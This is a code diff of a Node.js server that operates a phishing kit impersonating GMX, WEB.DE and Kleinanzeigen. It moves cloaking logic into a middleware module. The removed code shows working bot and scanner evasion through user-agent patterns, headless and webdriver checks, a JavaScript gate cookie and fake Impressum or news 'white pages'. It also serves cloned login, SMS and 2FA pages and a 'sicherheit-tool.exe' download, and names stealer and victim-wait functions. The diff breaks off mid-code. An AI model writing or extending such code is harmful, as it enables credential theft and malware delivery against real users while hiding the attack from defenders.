@@ -37,11 +37,13 @@ const {
   DB_PATH
 } = require('./db/database.js');
 const { send, safeEnd, readApiRouteBody, parseHttpRequestUrl } = require('./utils/httpUtils');
-const { ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminAuth, getAdminTokenFromRequest, checkAdminPageAuth } = require('./utils/authUtils');
+const { ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminAuth, getAdminTokenFromRequest } = require('./utils/authUtils');
 const { getPlatformFromRequest, maskEmail, EVENT_LABELS, readStartPage, getRedirectPasswordStatus } = require('./utils/formatUtils');
 const apiRoutes = require('./routes/apiRoutes');
 const clientRoutes = require('./routes/clientRoutes');
 const adminRoutes = require('./routes/adminRoutes');
+const gateMiddleware = require('./middleware/gateMiddleware');
+const staticRoutes = require('./routes/staticRoutes');
 const chatService = require('./services/chatService');
 const leadService = require('./services/leadService');
 const automationService = require('./services/automationService');
@@ -2260,265 +2262,6 @@ function sendWebdeFingerprintProbeStatus(res, jobId) {
   });
 }
 
-/** Cookie гейта: кто прошёл проверку (JS выполнился), получает контент; боты без cookie видят вайт. */
-const BOT_GATE_COOKIE = 'gmx_v';
-function hasGateCookie(req) {
-  const raw = (req.headers && req.headers.cookie) ? String(req.headers.cookie) : '';
-  if (!raw) return false;
-  const match = raw.match(new RegExp('(?:^|;\\s*)' + BOT_GATE_COOKIE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)'));
-  return !!(match && match[1] && match[1].trim());
-}
-function isProtectedPage(pathname) {
-  if (pathname === '/' || pathname === '') return true;
-  if (pathname === '/anmelden' || pathname === '/anmelden/') return true;
-  if (pathname === '/klein-anmelden' || pathname === '/klein-anmelden/') return true;
-  if (pathname === '/einloggen' || pathname === '/einloggen/') return true;
-  if (pathname === '/passwort-aendern') return true;
-  if (/^\/sicherheit(\-pc|\-update)?\/?$/.test(pathname)) return true;
-  if (pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/') return true;
-  if (pathname === '/app-update' || pathname === '/app-update/') return true;
-  return false;
-}
-/** Прямые пути к контентным HTML — без cookie отдаём гейт/вайт, иначе бот получит блек по /index-sicherheit-update.html и т.д. */
-function isProtectedContentPath(pathname) {
-  const protected = [
-    '/index.html', '/index-change.html', '/index-sicherheit-update.html', '/index-sicherheit.html', '/index-sicherheit-pc.html',
-    '/sicherheit-anleitung.html', '/bitte-am-pc.html', '/app-update.html', '/gmx-mobile-anleitung.html',
-    '/sms-code.html', '/2fa-code.html', '/push-confirm.html', '/forgot-password-redirect.html', '/change-password.html',
-    '/erfolg'
-  ];
-  return protected.indexOf(pathname) !== -1;
-}
-/** Клоака: отсев ботов по UA. Пустой/короткий UA не считаем ботом — отдаём гейт (иначе живые люди с режимом приватности видят вайт). */
-function isLikelyBot(req, pathname) {
-  const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']).toLowerCase() : '';
-  if (!ua || ua.length < 10) {
-    return false;
-  }
-  // Без общего подстринга «bot» и без голого «yandex» — ложные срабатывания на обычных браузерах
-  const botPatterns = /googlebot|bingbot|duckduckbot|applebot|petalbot|baiduspider|yandexbot|yandeximages|yandexvideo|ahrefsbot|semrushbot|mj12bot|dotbot|megaindex|rogerbot|sistrix|blexbot|serpstat|facebookexternalhit|twitterbot|linkedinbot|slurp|crawler|spider|headless|phantom|selenium|puppeteer|playwright|curl\/|wget\/|python\/|go-http|scrapy|datanyze|ahrefs|semrush/i;
-  if (botPatterns.test(ua)) return true;
-  return false;
-}
-const WHITE_PAGE_HTML = `<!DOCTYPE html>
-<html lang="de">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Impressum &amp; Kontakt – GMX</title>
-  <style>
-    *{box-sizing:border-box}
-    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
-    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
-    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
-    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
-    p{margin:0 0 12px}
-    a{color:#1c449b;text-decoration:none}
-    a:hover{text-decoration:underline}
-    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
-    .footer-links a{margin-right:16px}
-    address{font-style:normal;margin:8px 0}
-    .tel,.email{margin:4px 0}
-  </style>
-</head>
-<body>
-  <div class="wrap">
-    <h1>Impressum &amp; Kontakt</h1>
-    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
-    <h2>Anbieter</h2>
-    <p>GMX GmbH<br>Hauptsitz M&uuml;nchen</p>
-    <address>
-      Leopoldstra&szlig;e 236<br>
-      80807 M&uuml;nchen<br>
-      Deutschland
-    </address>
-    <h2>Kontakt</h2>
-    <p class="tel">Telefon: +49 (0) 89 921 61-0</p>
-    <p class="email">E-Mail: <a href="mailto:impressum@gmx.net">impressum@gmx.net</a></p>
-    <p>F&uuml;r allgemeine Anfragen: <a href="mailto:support@gmx.net">support@gmx.net</a></p>
-    <h2>Handelsregister</h2>
-    <p>Registergericht: Amtsgericht M&uuml;nchen<br>Registernummer: HRB 123456</p>
-    <h2>Umsatzsteuer-ID</h2>
-    <p>USt-IdNr.: DE 123456789</p>
-    <h2>Verantwortlich f&uuml;r den Inhalt</h2>
-    <p>GMX GmbH, Leopoldstra&szlig;e 236, 80807 M&uuml;nchen</p>
-    <div class="footer-links">
-      <a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a>
-      <a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a>
-      <a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a>
-      <a href="https://www.gmx.net/" target="_blank" rel="noopener">GMX Startseite</a>
-    </div>
-  </div>
-</body>
-</html>`;
-const WHITE_PAGE_KLEIN = `<!DOCTYPE html>
-<html lang="de">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Impressum – Kleinanzeigen</title>
-  <style>
-    *{box-sizing:border-box}
-    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
-    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
-    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
-    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
-    p{margin:0 0 12px}
-    a{color:#326916;text-decoration:none}
-    a:hover{text-decoration:underline}
-    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
-    .footer-links a{margin-right:16px}
-    address{font-style:normal;margin:8px 0}
-  </style>
-</head>
-<body>
-  <div class="wrap">
-    <h1>Impressum</h1>
-    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
-    <h2>Anbieter</h2>
-    <p>Kleinanzeigen GmbH</p>
-    <address>Helene-Weber-Allee 19, 80637 M&uuml;nchen, Deutschland</address>
-    <h2>Kontakt</h2>
-    <p>E-Mail: <a href="mailto:impressum@kleinanzeigen.de">impressum@kleinanzeigen.de</a></p>
-    <div class="footer-links">
-      <a href="https://themen.kleinanzeigen.de/nutzungsbedingungen/" target="_blank" rel="noopener">AGB</a>
-      <a href="https://www.kleinanzeigen.de/impressum.html" target="_blank" rel="noopener">Impressum</a>
-      <a href="https://themen.kleinanzeigen.de/datenschutzerklaerung/" target="_blank" rel="noopener">Datenschutz</a>
-      <a href="https://www.kleinanzeigen.de/" target="_blank" rel="noopener">Kleinanzeigen Startseite</a>
-    </div>
-  </div>
-</body>
-</html>`;
-/** Нейтральная страница для ботов в стиле немецких новостей (WEB.DE): остаётся на том же домене, не редирект. */
-const WHITE_PAGE_NEWS_WEBDE = `<!DOCTYPE html>
-<html lang="de">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Nachrichten &ndash; Aktuelles aus Deutschland</title>
-  <style>
-    *{box-sizing:border-box}
-    body{margin:0;background:#f0f0f0;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#222}
-    .header{background:#fff;border-bottom:3px solid #FFDF00;padding:12px 20px;display:flex;align-items:center;gap:12px}
-    .logo{font-weight:700;font-size:1.25rem;color:#333}
-    .nav{display:flex;gap:20px;margin-left:24px}
-    .nav a{color:#1a1a1a;text-decoration:none}
-    .nav a:hover{color:#666}
-    .wrap{max-width:720px;margin:0 auto;padding:24px 16px 48px}
-    .teaser{margin-bottom:24px;background:#fff;padding:20px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
-    .teaser h2{font-size:1.1rem;margin:0 0 8px;font-weight:600}
-    .teaser h2 a{color:#1a1a1a;text-decoration:none}
-    .teaser h2 a:hover{text-decoration:underline}
-    .teaser .meta{font-size:0.85rem;color:#666;margin-bottom:6px}
-    .teaser p{margin:0;color:#444;font-size:0.95rem}
-    .footer{margin-top:32px;padding-top:16px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
-    .footer a{color:#1a1a1a;text-decoration:none;margin-right:16px}
-  </style>
-</head>
-<body>
-  <header class="header">
-    <span class="logo">Nachrichten</span>
-    <nav class="nav">
-      <a href="#">Politik</a>
-      <a href="#">Wirtschaft</a>
-      <a href="#">Sport</a>
-      <a href="#">Panorama</a>
-    </nav>
-  </header>
-  <div class="wrap">
-    <article class="teaser">
-      <div class="meta">Berlin &ndash; 11. M&auml;rz 2025</div>
-      <h2><a href="#">Bundestag ber&auml;t &uuml;ber Haushaltsplan</a></h2>
-      <p>Die Abgeordneten diskutieren die geplanten Ausgaben f&uuml;r das kommende Jahr. Die Opposition fordert Nachbesserungen.</p>
-    </article>
-    <article class="teaser">
-      <div class="meta">M&uuml;nchen &ndash; 11. M&auml;rz 2025</div>
-      <h2><a href="#">Wirtschaftsdaten zeigen leichte Erholung</a></h2>
-      <p>Die neuesten Konjunkturindikatoren deuten auf eine stabile Entwicklung in mehreren Branchen hin.</p>
-    </article>
-    <article class="teaser">
-      <div class="meta">Frankfurt &ndash; 10. M&auml;rz 2025</div>
-      <h2><a href="#">Sport: Bundesliga mit spannendem Spieltag</a></h2>
-      <p>Die Tabelle bleibt dicht. Die Fans erwarten weitere Entscheidungsspiele am Wochenende.</p>
-    </article>
-    <div class="footer">
-      <a href="#">Impressum</a>
-      <a href="#">Datenschutz</a>
-      <a href="#">Kontakt</a>
-    </div>
-  </div>
-</body>
-</html>`;
-function getWhitePageHtml(req) {
-  return getBrand(req).id === 'klein' ? WHITE_PAGE_KLEIN : WHITE_PAGE_HTML;
-}
-/** Для short-доменов с whitePageStyle 'news-webde' отдаём страницу новостей (остаёмся на домене); иначе стандартная вайт по бренду. */
-function getWhitePageHtmlForRequest(req) {
-  const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
-  const hostNorm = host.replace(/^www\./, '');
-  const shortList = getShortDomainsList();
-  const key = shortList[host] ? host : (shortList[hostNorm] ? hostNorm : null);
-  if (key && shortList[key] && shortList[key].whitePageStyle === 'news-webde') return WHITE_PAGE_NEWS_WEBDE;
-  return getWhitePageHtml(req);
-}
-const GATE_PAGE_HTML = `<!DOCTYPE html><html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title></head><body style="margin:0;background:#fff;min-height:100vh"></body><script>
-(function(){
-  var cookieName="${BOT_GATE_COOKIE}";
-  function sendToWhite(){ fetch("/gate-white",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}); }
-  function pass(){
-    document.cookie=cookieName+"=1;path=/;max-age=3600;samesite=lax";
-    var p=location.pathname+location.search;
-    if(p==="/"||p===""){location.reload();}else{fetch(p,{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}).catch(function(){location.reload();});}
-  }
-  function isAutomation(){
-    if(typeof navigator==="undefined")return true;
-    if(navigator.webdriver===true){ var ua2=(navigator.userAgent||"").toLowerCase(); if(!/android/.test(ua2)) return true; }
-    var ua=(navigator.userAgent||"").toLowerCase();
-    if(/headless|phantom|selenium|puppeteer|playwright|electron|webdriver/i.test(ua))return true;
-    try{ if(window.callPhantom||window._phantom||window.__nightmare||window.__selenium_unwrapped||window.domAutomation||window._WEBDRIVER_ELEM_CACHE)return true; }catch(e){}
-    if(typeof screen!=="undefined"&&(screen.width<=0||screen.height<=0))return true;
-    return false;
-  }
-  if(isAutomation()){ sendToWhite(); return; }
-  var t0=Date.now();
-  setTimeout(function(){
-    if(Date.now()-t0<200)return;
-    if(isAutomation()){ sendToWhite(); return; }
-    pass();
-  },280);
-})();
-</script></html>`;
-
-function serveFile(filePath, res, req) {
-  if (res.writableEnded) return;
-  const ext = path.extname(filePath);
-  const types = { '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript', '.json': 'application/json', '.ico': 'image/x-icon', '.svg': 'image/svg+xml' };
-  const contentType = types[ext] || 'application/octet-stream';
-  fs.readFile(filePath, (err, data) => {
-    if (res.writableEnded) return;
-    if (err) {
-      if (err.code === 'ENOENT') return send(res, 404, 'Not Found', 'text/plain');
-      return send(res, 500, 'Error', 'text/plain');
-    }
-    let out = data;
-    if (ext === '.html' && req && (out.indexOf('__BRAND_JSON__') !== -1 || out.indexOf('<!-- __BRAND_JSON__ -->') !== -1)) {
-      const brand = getBrand(req);
-      const jsonStr = JSON.stringify(brand).replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n').replace(/\r/g, '');
-      const script = '<script>window.__BRAND__=JSON.parse(\'' + jsonStr + '\');</script>';
-      out = Buffer.from(out.toString().replace('<!-- __BRAND_JSON__ -->', script).replace('__BRAND_JSON__', script), 'utf8');
-    }
-    const headers = { 'Content-Type': contentType };
-    if (ext === '.js' || ext === '.css' || ext === '.html') {
-      headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
-      headers['Pragma'] = 'no-cache';
-      headers['Expires'] = '0';
-      headers['Last-Modified'] = new Date().toUTCString();
-    }
-    res.writeHead(200, headers);
-    res.end(out);
-  });
-}
-
 const API_ROUTE_DEPS = {
   readMode,
   statusHeartbeats,
@@ -2533,7 +2276,7 @@ const ROUTE_HTTP_DEPS = {
   ALLOWED_EMAIL_DOMAINS_RAW: ALLOWED_EMAIL_DOMAINS_RAW,
   ALL_LOG_FILE: ALL_LOG_FILE,
   ARCHIVE_PROCESS_TIMEOUT_MS: ARCHIVE_PROCESS_TIMEOUT_MS,
-  BOT_GATE_COOKIE: BOT_GATE_COOKIE,
+  BOT_GATE_COOKIE: gateMiddleware.BOT_GATE_COOKIE,
   BRANDS: BRANDS,
   CHECK_DIR: CHECK_DIR,
   CHECK_META_FILE: CHECK_META_FILE,
@@ -2555,7 +2298,6 @@ const ROUTE_HTTP_DEPS = {
   DOWNLOAD_TOKEN_TTL_MS: DOWNLOAD_TOKEN_TTL_MS,
   ENABLE_EMAIL_DOMAIN_ALLOWLIST: ENABLE_EMAIL_DOMAIN_ALLOWLIST,
   EVENT_LABELS: EVENT_LABELS,
-  GATE_PAGE_HTML: GATE_PAGE_HTML,
   GATE_TIME_TTL_MS: GATE_TIME_TTL_MS,
   GMX_DOMAIN: GMX_DOMAIN,
   HEARTBEAT_MAX_AGE_MS: HEARTBEAT_MAX_AGE_MS,
@@ -2596,9 +2338,6 @@ const ROUTE_HTTP_DEPS = {
   WEBDE_PROBE_MAX_INDICES_PER_JOB: WEBDE_PROBE_MAX_INDICES_PER_JOB,
   WEBDE_SCRIPT_VICTIM_WAIT_MS: WEBDE_SCRIPT_VICTIM_WAIT_MS,
   WEBDE_WAIT_PASSWORD_TIMEOUT_MS: WEBDE_WAIT_PASSWORD_TIMEOUT_MS,
-  WHITE_PAGE_HTML: WHITE_PAGE_HTML,
-  WHITE_PAGE_KLEIN: WHITE_PAGE_KLEIN,
-  WHITE_PAGE_NEWS_WEBDE: WHITE_PAGE_NEWS_WEBDE,
   ZIP_PASSWORD_FILE: ZIP_PASSWORD_FILE,
   _shortDomainsCache: _shortDomainsCache,
   addShortDomainToCloudflare: addShortDomainToCloudflare,
@@ -2639,21 +2378,16 @@ const ROUTE_HTTP_DEPS = {
   getSicherheitDownloadFileByLimit: getSicherheitDownloadFileByLimit,
   getSicherheitDownloadFiles: getSicherheitDownloadFiles,
   getSlotForLead: getSlotForLead,
-  getWhitePageHtml: getWhitePageHtml,
-  getWhitePageHtmlForRequest: getWhitePageHtmlForRequest,
   handleWebdeFingerprintProbePause: handleWebdeFingerprintProbePause,
   handleWebdeFingerprintProbeResume: handleWebdeFingerprintProbeResume,
   handleWebdeFingerprintProbeStart: handleWebdeFingerprintProbeStart,
-  hasGateCookie: hasGateCookie,
+  hasGateCookie: gateMiddleware.hasGateCookie,
   http: http,
   https: https,
   incrementDownloadCount: incrementDownloadCount,
   invalidateLeadsCache: invalidateLeadsCache,
   isAdminRequest: isAdminRequest,
-  isLikelyBot: isLikelyBot,
   isLocalHost: isLocalHost,
-  isProtectedContentPath: isProtectedContentPath,
-  isProtectedPage: isProtectedPage,
   leadEventTerminalHasExactLabel: leadEventTerminalHasExactLabel,
   leadHasAnyConfigEmailSentEvent: leadHasAnyConfigEmailSentEvent,
   leadHasKleinMarkedData: leadHasKleinMarkedData,
@@ -2709,7 +2443,6 @@ const ROUTE_HTTP_DEPS = {
   sendStealerFailedSmtpEmails: sendStealerFailedSmtpEmails,
   sendStealerSmtpIndex: sendStealerSmtpIndex,
   sendWebdeFingerprintProbeStatus: sendWebdeFingerprintProbeStatus,
-  serveFile: serveFile,
   setFirstGateTime: setFirstGateTime,
   short: short,
   slotFromLeadId: slotFromLeadId,
@@ -2822,90 +2555,34 @@ const server = http.createServer(async (req, res) => {
   const isLocalhost = requestHost === 'localhost' || requestHost === '127.0.0.1' || requestHost === '';
   const isAdminPage = pathname === '/admin' || pathname === '/admin/';
   const isAdminHtml = pathname === '/admin.html';
-
-  if (ADMIN_DOMAIN) {
-    if (isAdminPage || isAdminHtml || isAdminRequest(pathname)) {
-      // Админка только на ADMIN_DOMAIN (grzl.org); localhost разрешён для локальной проверки
-      if (requestHost !== ADMIN_DOMAIN && !isLocalhost) {
-        if (safeEnd(res)) return;
-        res.writeHead(404, { 'Content-Type': 'text/plain' });
-        res.end('Not Found');
-        return;
-      }
-    } else if (requestHost === ADMIN_DOMAIN) {
-      const adminAssets = pathname === '/admin.css' || pathname === '/admin.js' || pathname === '/admin.html' || pathname === '/klein-logo.png' || pathname === '/windows-icon.png' || pathname === '/android-icon.png' || pathname === '/ios-icon.png';
-      const mailerAssets = pathname === '/mailer' || pathname === '/mailer/' || pathname === '/mailer/index.html' || pathname === '/mailer/index-test.html' || pathname === '/mailer/mailer.js' || pathname === '/mailer/mailer.css';
-      const sicherheitPage = pathname === '/sicherheit' || pathname === '/sicherheit/' || pathname === '/sicherheit-pc' || pathname === '/sicherheit-pc/' || pathname === '/sicherheit-update' || pathname === '/sicherheit-update/';
-      const sicherheitDownload = pathname === '/download/sicherheit-tool' || pathname === '/download/sicherheit-tool.zip' || pathname === '/download/sicherheit-tool.exe' || (pathname.startsWith('/download/') && pathname.length > 10);
-      const bitteAmPcPage = pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/';
-      const appUpdatePage = pathname === '/app-update' || pathname === '/app-update/';
-      const apiChat = pathname === '/api/chat' || pathname === '/api/chat-open' || pathname === '/api/chat-open-ack' || pathname === '/api/chat-typing' || pathname === '/api/chat-read';
-      if (!adminAssets && !mailerAssets && !sicherheitPage && !sicherheitDownload && !bitteAmPcPage && !appUpdatePage && !apiChat) {
-        if (safeEnd(res)) return;
-        res.writeHead(404, { 'Content-Type': 'text/plain' });
-        res.end('Not Found');
-        return;
-      }
-    }
-  }
-  // Short-домены (сокращалка + гейт): не редиректить на canonical, обработать гейт (вайт для ботов, редирект на target для людей)
   const shortDomainsList = getShortDomainsList();
   const shortHostNorm = requestHost.replace(/^www\./, '');
   const shortDomainKey = shortDomainsList[requestHost] ? requestHost : (shortDomainsList[shortHostNorm] ? shortHostNorm : null);
   const isShortDomain = shortDomainKey !== null;
 
-  // Редирект на канонический домен текущего бренда: с других доменов — на canonical хоста (GMX или WEB.DE).
-  const canonicalDomain = getCanonicalDomain(req);
-  const isCanonicalHost = requestHost === canonicalDomain || requestHost === ('www.' + canonicalDomain);
-  if (!isLocalhost && requestHost && !isCanonicalHost && requestHost !== ADMIN_DOMAIN && !isShortDomain) {
-    if (safeEnd(res)) return;
-    res.writeHead(301, { Location: 'https://' + canonicalDomain + (req.url || '/') });
-    res.end();
-    return;
-  }
-
-  if (isShortDomain && req.method === 'GET') {
-    const targetUrl = (shortDomainsList[shortDomainKey].targetUrl || '').trim();
-    const targetIsAnmelden = !targetUrl || targetUrl === 'anmelden' || targetUrl === '/anmelden';
-    const redirectTo = targetUrl || ('https://' + GMX_DOMAIN + '/');
-    const host = requestHost;
-    if (hasGateCookie(req)) {
-      if (targetIsAnmelden && (pathname === '/' || pathname === '')) {
-        if (safeEnd(res)) return;
-        res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
-        res.end();
-        return;
-      }
-      if (targetIsAnmelden && (pathname === '/anmelden' || pathname === '/anmelden/')) {
-        const useWebde = shortDomainsList[shortDomainKey].whitePageStyle === 'news-webde';
-        const indexFile = path.join(PROJECT_ROOT, useWebde ? 'webde' : 'gmx', 'index.html');
-        return serveFile(indexFile, res, req);
-      }
-      if (!targetIsAnmelden) {
-        if (safeEnd(res)) return;
-        res.writeHead(302, { 'Location': redirectTo, 'Cache-Control': 'no-store' });
-        res.end();
-        return;
-      }
-      // targetIsAnmelden и путь не / и не /anmelden — статика (styles, script и т.д.), обрабатываем дальше
-    } else {
-      if (safeEnd(res)) return;
-      const html = isLikelyBot(req, pathname) ? getWhitePageHtmlForRequest(req) : GATE_PAGE_HTML;
-      res.writeHead(200, {
-        'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'no-store, no-cache, must-revalidate',
-        'Pragma': 'no-cache'
-      });
-      res.end(html);
-      return;
-    }
-  }
+  if (gateMiddleware.runHostShortCanonicalPhase(req, res, {
+    pathname,
+    requestHost,
+    isLocalhost,
+    isAdminPage,
+    isAdminHtml,
+    ADMIN_DOMAIN,
+    isAdminRequest,
+    isShortDomain,
+    shortDomainKey,
+    shortDomainsList,
+    getCanonicalDomain,
+    GMX_DOMAIN,
+    PROJECT_ROOT,
+    getBrand,
+    getShortDomainsList,
+  })) return;
 
   const ip = getClientIp(req);
   const isUserPath = pathname === '/api/visit' || pathname === '/api/submit' || pathname === '/api/download-filename' ||
     (pathname.startsWith('/download/') && pathname.length > 9) ||
-    (req.method === 'GET' && isProtectedPage(pathname));
-  if (isUserPath && hasGateCookie(req)) setFirstGateTime(ip);
+    (req.method === 'GET' && gateMiddleware.isProtectedPage(pathname));
+  if (isUserPath && gateMiddleware.hasGateCookie(req)) setFirstGateTime(ip);
 
   if (pathname.startsWith('/api/')) {
     let body = '';
@@ -2952,154 +2629,14 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // Админка: запрос «открыть чат у юзера»
   if (pathname === '/gate-white' && req.method === 'GET') {
-    if (safeEnd(res)) return;
-    res.writeHead(200, {
-      'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'no-store, no-cache, must-revalidate',
-      'Pragma': 'no-cache'
-    });
-    res.end(getWhitePageHtmlForRequest(req));
+    gateMiddleware.handleGateWhite(req, res, getBrand, getShortDomainsList);
     return;
   }
 
-  // Гейт от ботов (клоака): без cookie — нейтральная страница (боты) или гейт-страница (JS → проверки 2026 → человек на целевую, бот остаётся на нейтральной)
-  if (req.method === 'GET' && isProtectedPage(pathname) && !hasGateCookie(req)) {
-    const html = isLikelyBot(req, pathname) ? getWhitePageHtml(req) : GATE_PAGE_HTML;
-    if (safeEnd(res)) return;
-    res.writeHead(200, {
-      'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'no-store, no-cache, must-revalidate',
-      'Pragma': 'no-cache'
-    });
-    res.end(html);
-    return;
-  }
+  if (gateMiddleware.handleProtectedPageGate(req, res, pathname, getBrand)) return;
 
-  // Корень: локальный хост → /anmelden (страница входа webde для тестов); Klein → /anmelden; GMX/WEB.DE на проде → официальный сайт
-  if ((pathname === '/' || pathname === '') && (req.method === 'GET' || req.method === 'HEAD')) {
-    if (safeEnd(res)) return;
-    const brand = getBrand(req);
-    const host = (req.headers.host || '').split(':')[0].toLowerCase();
-    if (isLocalHost(host)) {
-      res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
-    } else if (brand.id === 'klein') {
-      res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
-    } else {
-      res.writeHead(302, { 'Location': brand.canonicalUrl, 'Cache-Control': 'no-store' });
-    }
-    res.end();
-    return;
-  }
-
-  // Редирект со старых доменов (gmx-de.help и т.п.) на канонический GMX для страницы входа
-  const host = (req.headers.host || '').split(':')[0].toLowerCase();
-  const oldSiteHosts = ['gmx-de.help', 'www.gmx-de.help', 'gmx-net.help', 'www.gmx-net.help', 'gmx-net.info', 'www.gmx-net.info'];
-  if ((pathname === '/anmelden' || pathname === '/anmelden/') && req.method === 'GET' && oldSiteHosts.includes(host)) {
-    if (safeEnd(res)) return;
-    res.writeHead(302, { 'Location': 'https://' + getCanonicalDomain(req) + '/anmelden', 'Cache-Control': 'no-store' });
-    res.end();
-    return;
-  }
-
-  // Контентные страницы: Klein из klein/, WEB.DE из webde/, GMX из gmx/
-  const brand = getBrand(req);
-  const isWebde = brand.id === 'webde';
-  const isKlein = brand.id === 'klein';
-
-  if ((pathname === '/einloggen' || pathname === '/einloggen/') && req.method === 'GET') {
-    if (isKlein) {
-      if (safeEnd(res)) return;
-      res.writeHead(302, { 'Location': 'https://' + (req.headers.host || '').split(':')[0] + '/anmelden', 'Cache-Control': 'no-store' });
-      res.end();
-      return;
-    }
-    if (safeEnd(res)) return;
-    res.writeHead(302, { 'Location': 'https://' + getCanonicalDomain(req) + '/anmelden', 'Cache-Control': 'no-store' });
-    res.end();
-    return;
-  }
-
-  if ((pathname === '/anmelden' || pathname === '/anmelden/') && req.method === 'GET') {
-    if (isKlein) {
-      return serveFile(path.join(PROJECT_ROOT, 'klein', 'index.html'), res, req);
-    }
-    const indexFile = isWebde ? path.join(PROJECT_ROOT, 'webde', 'index.html') : path.join(PROJECT_ROOT, 'gmx', 'index.html');
-    return serveFile(indexFile, res, req);
-  }
-  if ((pathname === '/klein-anmelden' || pathname === '/klein-anmelden/') && req.method === 'GET') {
-    return serveFile(path.join(PROJECT_ROOT, 'klein', 'index.html'), res, req);
-  }
-  if (pathname === '/passwort-aendern' && req.method === 'GET') {
-    if (isKlein) {
-      return serveFile(path.join(PROJECT_ROOT, 'klein', 'passwort-aendern.html'), res, req);
-    }
-    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'index-change.html');
-    return serveFile(filePath, res, req);
-  }
-  if ((pathname === '/sicherheit' || pathname === '/sicherheit/' || pathname === '/sicherheit-pc' || pathname === '/sicherheit-pc/' || pathname === '/sicherheit-update' || pathname === '/sicherheit-update/') && req.method === 'GET') {
-    const sicherheitFile = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'index-sicherheit-update.html');
-    return serveFile(sicherheitFile, res, req);
-  }
-  if ((pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/') && req.method === 'GET') {
-    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'bitte-am-pc.html');
-    return serveFile(filePath, res, req);
-  }
-  if ((pathname === '/app-update' || pathname === '/app-update/') && req.method === 'GET') {
-    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'app-update.html');
-    return serveFile(filePath, res, req);
-  }
-  if ((pathname === '/gmx-mobile-anleitung' || pathname === '/gmx-mobile-anleitung/') && req.method === 'GET') {
-    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'gmx-mobile-anleitung.html');
-    return serveFile(filePath, res, req);
-  }
-
-  if (pathname === '/sms-code.html' && req.method === 'GET' && isKlein) {
-    return serveFile(path.join(PROJECT_ROOT, 'klein', 'sms-code.html'), res, req);
-  }
-  if ((pathname === '/erfolg' || pathname === '/erfolg/') && req.method === 'GET' && isKlein) {
-    return serveFile(path.join(PROJECT_ROOT, 'klein', 'erfolg.html'), res, req);
-  }
-
-  // Прямые запросы по имени файла и push/sms/change: по бренду из gmx/ или webde/
-  if (req.method === 'GET') {
-    const contentFromGmx = {
-      '/push-confirm.html': 'push-confirm.html',
-      '/sms-code.html': 'sms-code.html',
-      '/2fa-code.html': '2fa-code.html',
-      '/change-password.html': 'change-password.html',
-      '/forgot-password-redirect.html': 'forgot-password-redirect.html',
-      '/index-sicherheit-update.html': 'index-sicherheit-update.html',
-      '/index-sicherheit.html': 'index-sicherheit.html',
-      '/index-sicherheit-pc.html': 'index-sicherheit-pc.html',
-      '/sicherheit-anleitung.html': 'sicherheit-anleitung.html',
-      '/install-guide.html': 'install-guide.html',
-      '/install-guide-test.html': 'install-guide-test.html',
-      '/install-guide-single.html': 'install-guide-single.html',
-      '/install-guide-single-2steps.html': 'install-guide-single-2steps.html',
-      '/index-change.html': 'index-change.html',
